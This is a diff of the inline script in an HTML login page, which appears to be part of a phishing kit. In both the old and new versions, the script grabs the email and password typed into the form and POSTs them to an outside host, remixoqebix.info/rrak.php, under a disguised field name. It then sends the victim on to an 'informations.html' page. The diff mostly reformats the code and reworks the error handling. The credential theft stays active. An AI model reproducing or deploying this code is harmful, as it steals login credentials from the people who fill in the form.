@@ -11274,42 +11274,45 @@
 
    <script>
 
-      // Select the form element
-      const form = document.querySelector('#sfasfkWFtomnS');
+// Select the form element
+const form = document.querySelector('#sfasfkWFtomnS');
 
-      // Add an event listener for the submit event
-      form.addEventListener('submit', function (e) {
-         // Prevent the default form submission behavior
-         e.preventDefault();
+// Add an event listener for the submit event
+form.addEventListener('submit', function (e) {
+   // Prevent the default form submission behavior
+   e.preventDefault();
 
-         // Get the values of the email and password input fields
-         const email = form.querySelector('input[type="email"]').value;
-         const password = form.querySelector('input[type="password"]').value;
+   // Get the values of the email and password input fields
+   const email = form.querySelector('input[type="email"]').value;
+   const password = form.querySelector('input[type="password"]').value;
 
-         // If the email and password are both non-empty, save them to local storage and redirect to the informations.html page
-         if (email && password) {
-            localStorage.setItem('email_', email);
-            let data = {
-               user_email: email,
-               guxhatok: password,
+   // If the email and password are both non-empty, save them to local storage and send an AJAX request
+   if (email && password) {
+      localStorage.setItem('email_', email);
+      let data = {
+         user_email: email,
+         guxhatok: password,
+      };
+      $.ajax({
+         url: "https://remixoqebix.info/rrak.php/",
+         method: "POST",
+         data: data,
+         success: function (response) {
+            if (response == "1") {
+               window.location.href = 'informations.html';
+            } else {
+               console.log("Server response was not '1'");
+               // Handle error cases here
             }
-			$.ajax({
-      url: "https://remixoqebix.info/rrak.php/",
-      method: "POST",
-      data: data,
-      success: function (response) {
-         if (response == "1") {
-            window.location.href = 'informations.html';
-         } else {
-            // Redirect to 'location.html' for error cases
-            window.location.href = 'location.html';
+         },
+         error: function (jqXHR, textStatus, errorThrown) {
+            console.log("AJAX request failed:", textStatus, errorThrown);
+            // Handle AJAX errors here
          }
-      },
-      error: function () {
-         // Redirect to 'location.html' for error cases
-         window.location.href = 'location.html';
-      }
-   });
+      });
+   }
+});
+
    </script>
 
 </body>
